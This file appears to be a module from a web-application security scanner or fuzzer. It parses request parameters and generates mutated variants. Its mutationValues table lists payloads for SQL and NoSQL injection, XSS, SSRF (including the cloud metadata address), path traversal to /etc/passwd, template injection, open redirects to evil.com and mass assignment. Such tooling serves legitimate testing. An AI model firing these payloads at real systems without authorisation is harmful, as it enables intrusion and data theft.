const url = require('url');

class Parameters {
  extractFromUrl(targetUrl) {
    const parsed = new URL(targetUrl);
    const params = {};
    for (const [key, value] of parsed.searchParams) {
      params[key] = value;
    }
    return {
      baseUrl: `${parsed.origin}${parsed.pathname}`,
      params,
      hash: parsed.hash,
      protocol: parsed.protocol,
      hostname: parsed.hostname,
      port: parsed.port,
      pathname: parsed.pathname,
      paramCount: Object.keys(params).length
    };
  }

  extractFromBody(body, contentType = 'application/x-www-form-urlencoded') {
    if (contentType.includes('json')) {
      try {
        const parsed = JSON.parse(body);
        return this.flattenObject(parsed);
      } catch { return {}; }
    }
    if (contentType.includes('urlencoded')) {
      const params = {};
      body.split('&').forEach(pair => {
        const [k, v] = pair.split('=').map(decodeURIComponent);
        params[k] = v;
      });
      return params;
    }
    return {};
  }

  flattenObject(obj, prefix = '') {
    const result = {};
    for (const [key, value] of Object.entries(obj)) {
      const fullKey = prefix ? `${prefix}[${key}]` : key;
      if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
        Object.assign(result, this.flattenObject(value, fullKey));
      } else if (Array.isArray(value)) {
        value.forEach((v, i) => { result[`${fullKey}[${i}]`] = v; });
      } else {
        result[fullKey] = value;
      }
    }
    return result;
  }

  buildUrl(baseUrl, params) {
    const parsed = new URL(baseUrl);
    Object.entries(params).forEach(([k, v]) => parsed.searchParams.set(k, v));
    return parsed.toString();
  }

  buildBody(params, format = 'urlencoded') {
    if (format === 'json') return JSON.stringify(params);
    return Object.entries(params).map(([k, v]) =>
      `${encodeURIComponent(k)}=${encodeURIComponent(v)}`
    ).join('&');
  }

  generateCombinations(params, values = ['', 'true', 'false', '1', '0', 'null', 'undefined', 'admin', 'test']) {
    const combos = [];
    for (const [key] of Object.entries(params)) {
      for (const value of values) {
        const mutated = { ...params, [key]: value };
        combos.push({ param: key, value, params: mutated });
      }
    }
    return combos;
  }

  generateAllCombinations(params) {
    if (Object.keys(params).length === 0) return [{}];
    const entries = Object.entries(params);
    const results = [];
    function backtrack(idx, current) {
      if (idx === entries.length) { results.push({ ...current }); return; }
      const [key, origValue] = entries[idx];
      const variants = [origValue, '', 'null', 'undefined', 'true', 'false', '1', '0'];
      for (const val of variants) {
        current[key] = val;
        backtrack(idx + 1, current);
      }
    }
    backtrack(0, {});
    return results;
  }

  mutationValues = {
    idor: ['1', '2', '3', '100', '1000'],
    sqli: ["'", "''", "1' OR '1'='1", "1' UNION SELECT 1--", "' OR 1=1--"],
    xss: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>'],
    ssrf: ['http://localhost', 'http://127.0.0.1', 'http://169.254.169.254', 'http://[::1]'],
    lfi: ['../../../etc/passwd', '....//....//....//etc/passwd', '..\\..\\..\\windows\\win.ini'],
    ssti: ['{{7*7}}', '${7*7}', '#{7*7}', '{{config}}'],
    openRedirect: ['//evil.com', 'https://evil.com', '///evil.com', '//evil.com@target.com'],
    protopollution: ['__proto__[test]=true', 'constructor[prototype][test]=true'],
    nosqli: ['{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}'],
    massAssignment: ['is_admin=true', 'role=admin', 'verified=true', '{"is_admin":true}']
  };

  generateMutationSet(params, attackType = 'idor') {
    const values = this.mutationValues[attackType] || this.mutationValues.idor;
    return this.generateCombinations(params, values);
  }

  async testParameterPollution(url, params, injectionParam) {
    const parsed = new URL(url);
    const testValues = ['1', 'true', 'admin'];
    const results = [];
    for (const val of testValues) {
      parsed.searchParams.set(injectionParam, params[injectionParam] || '');
      parsed.searchParams.append(injectionParam, val);
      results.push({
        url: parsed.toString(),
        injectedParam: injectionParam,
        injectedValue: val,
        duplicates: parsed.searchParams.getAll(injectionParam)
      });
    }
    return results;
  }

  async fuzzParameterNames(baseUrl, existingParams, wordlist = ['id', 'uuid', 'token', 'key', 'secret', 'api', 'admin', 'debug', 'test', 'q', 's', 'search', 'page', 'limit', 'offset', 'sort', 'filter', 'where', 'select', 'include', 'fields', 'action', 'type', 'mode', 'format', 'callback', '_method']) {
    const results = [];
    for (const word of wordlist) {
      if (existingParams[word]) continue;
      const testParams = { ...existingParams, [word]: '1' };
      results.push({
        param: word,
        url: this.buildUrl(baseUrl, testParams),
        originalParams: existingParams,
        newParams: testParams
      });
    }
    return results;
  }

  async extractFromResponse(responseBody) {
    const results = { url: [], json: [], headers: [] };
    try {
      const parsed = JSON.parse(responseBody);
      const extract = (obj, prefix = '') => {
        for (const [key, value] of Object.entries(obj)) {
          if (typeof value === 'string' && (value.startsWith('http') || value.includes('api'))) {
            results.url.push({ key, value });
          } else if (typeof value === 'object') {
            extract(value, `${prefix}${key}.`);
          } else {
            results.json.push({ key: `${prefix}${key}`, value });
          }
        }
      };
      extract(parsed);
    } catch {}
    return results;
  }
}

module.exports = { Parameters };
